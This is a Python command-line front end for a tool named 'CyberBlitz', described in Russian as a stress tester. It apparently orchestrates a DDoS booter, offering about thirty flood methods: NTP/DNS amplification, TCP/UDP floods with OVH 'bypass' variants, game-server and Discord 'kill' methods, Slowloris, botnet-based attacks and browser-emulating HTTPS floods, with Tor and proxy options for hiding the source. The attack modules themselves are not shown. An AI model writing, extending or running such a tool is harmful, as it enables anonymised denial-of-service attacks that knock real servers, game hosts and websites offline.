import click
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from config import update_config, CONFIG
from attacks.layer4 import AMPAttack, TCPAttack, UDPAttack, GameAttack, SpecialAttack, SlowLorisAttack
from attacks.layer7 import HTTPAttack, BrowserAttack, get_locust_attack
from attacks.botnet import BotnetAttack
import asyncio
import time

console = Console()

@click.group()
def cli():
    """CyberBlitz - Мощный стресс-тестер для тестировщиков"""
    pass

@cli.command()
@click.option('--target', required=True, help='Цель атаки (IP или URL)')
@click.option('--port', type=int, default=80, help='Порт атаки')
@click.option('--method', required=True, type=str, help='Метод атаки (NTP, TCP-SYN, HTTPS-FLOODER, SLOWLORIS и т.д.)')
@click.option('--threads', type=int, default=50, help='Количество потоков')
@click.option('--duration', type=int, default=60, help='Длительность атаки (сек)')
@click.option('--use-tor', is_flag=True, help='Использовать Tor')
@click.option('--tor-lib', type=click.Choice(['torpy', 'torsocks']), default='torpy', help='Библиотека Tor')
@click.option('--use-proxy', is_flag=True, help='Использовать прокси')
@click.option('--browser', type=click.Choice(['none', 'selenium', 'playwright']), default='none', help='Браузер для атак')
@click.option('--clicks', is_flag=True, help='Включить клики в браузере')
@click.option('--scroll', is_flag=True, help='Включить прокрутку в браузере')
@click.option('--delay', type=float, default=1.0, help='Задержка между действиями браузера (сек)')

def attack(target, port, method, threads, duration, use_tor, tor_lib, use_proxy, browser, clicks, scroll, delay):
    """Запуск атаки"""
    valid_methods = [
        'NTP', 'STUN', 'DNS', 'WSD', 'SADP',
        'TCP-ACK', 'TCP-SYN', 'TCP-BYPASS', 'OVH-TCP',
        'UDP', 'UDP-VSE', 'UDP-BYPASS',
        'GAME', 'GAME-MC', 'GAME-WARZONE', 'GAME-R6', 'FIVEM-KILL',
        'SSH-AUTH', 'GAME-KILL', 'TCP-SOCKET', 'DISCORD', 'SLOWLORIS',
        'UDPBYPASS-BOT', 'OVH-HTTP', 'GREBOT-BOT', 'TCPBOT-BOT',
        'HTTPS-FLOODER', 'HTTPS-BYPASS', 'HTTP-BROWSER', 'HTTPS-ARTERMIS', 'LOCUST-HTTP'
    ]
    if method not in valid_methods:
        console.print(f"[red]Ошибка: Метод '{method}' не поддерживается. Доступные методы: {', '.join(valid_methods)}[/red]")
        return

    if threads > 50 and browser in ['selenium', 'playwright']:
        console.print(f"[yellow]Предупреждение: Высокое количество threads ({threads}) для {browser} может перегрузить систему. Рекомендуется до 50 threads.[/yellow]")

    update_config(
        target_ip=target, target_url=target, port=port, threads=threads, duration=duration,
        use_tor=use_tor, tor_library=tor_lib, use_proxy=use_proxy, use_browser=browser,
        browser_behavior={"clicks": clicks, "scroll": scroll, "delay": delay}
    )

    attack_methods = {
        'NTP': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'NTP', CONFIG['duration']),
        'STUN': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'STUN', CONFIG['duration']),
        'DNS': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'DNS', CONFIG['duration']),
        'WSD': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'WSD', CONFIG['duration']),
        'SADP': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'SADP', CONFIG['duration']),
        'TCP-ACK': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-ACK', CONFIG['duration']),
        'TCP-SYN': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-SYN', CONFIG['duration']),
        'TCP-BYPASS': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-BYPASS', CONFIG['duration']),
        'OVH-TCP': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'OVH-TCP', CONFIG['duration']),
        'UDP': lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], 'UDP', CONFIG['duration']),
        'UDP-VSE': lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], 'UDP-VSE', CONFIG['duration']),
        'UDP-BYPASS': lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], 'UDP-BYPASS', CONFIG['duration']),
        'GAME': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'GAME', CONFIG['duration']),
        'GAME-MC': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'GAME-MC', CONFIG['duration']),
        'GAME-WARZONE': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'GAME-WARZONE', CONFIG['duration']),
        'GAME-R6': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'GAME-R6', CONFIG['duration']),
        'FIVEM-KILL': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'FIVEM-KILL', CONFIG['duration']),
        'SSH-AUTH': lambda: SpecialAttack(CONFIG['target_ip'], CONFIG['port'], 'SSH-AUTH', CONFIG['duration']),
        'GAME-KILL': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'GAME-KILL', CONFIG['duration']),
        'TCP-SOCKET': lambda: SpecialAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-SOCKET', CONFIG['duration']),
        'DISCORD': lambda: SpecialAttack(CONFIG['target_ip'], CONFIG['port'], 'DISCORD', CONFIG['duration']),
        'SLOWLORIS': lambda: SlowLorisAttack(CONFIG['target_ip'], CONFIG['port'], 'SLOWLORIS', CONFIG['duration']),
        'UDPBYPASS-BOT': lambda: BotnetAttack(CONFIG['target_ip'], CONFIG['port'], 'UDPBYPASS-BOT', CONFIG['duration']),
        'OVH-HTTP': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'OVH-HTTP'),
        'GREBOT-BOT': lambda: BotnetAttack(CONFIG['target_ip'], CONFIG['port'], 'GREBOT-BOT', CONFIG['duration']),
        'TCPBOT-BOT': lambda: BotnetAttack(CONFIG['target_ip'], CONFIG['port'], 'TCPBOT-BOT', CONFIG['duration']),
        'HTTPS-FLOODER': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-FLOODER'),
        'HTTPS-BYPASS': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-BYPASS'),
        'HTTP-BROWSER': lambda: BrowserAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTP-BROWSER'),
        'HTTPS-ARTERMIS': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-ARTERMIS'),
        'LOCUST-HTTP': lambda: get_locust_attack()(CONFIG['target_url'], CONFIG['duration'], 'LOCUST-HTTP')
    }

    with Progress() as progress:
        task = progress.add_task(f"[cyan]Запуск {method} атаки...", total=duration)
        start_time = time.time()
        try:
            attack_instance = attack_methods[method]()
            
            if asyncio.iscoroutinefunction(attack_instance.run):
                asyncio.run(attack_instance.run())
            else:
                attack_instance.run()

            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                progress.update(task, completed=elapsed)
                time.sleep(1)
        except Exception as e:
            console.print(f"[red]Ошибка при выполнении атаки: {e}[/red]")
        progress.update(task, completed=duration)
    
    table = Table(title="Результат атаки")
    table.add_column("Параметр", style="cyan")
    table.add_column("Значение", style="magenta")
    table.add_row("Цель", target)
    table.add_row("Метод", method)
    table.add_row("Длительность", f"{duration} сек")
    table.add_row("Tor", str(use_tor))
    table.add_row("Прокси", str(use_proxy))
    table.add_row("Браузер", browser)
    console.print(table)

if __name__ == "__main__":
    cli()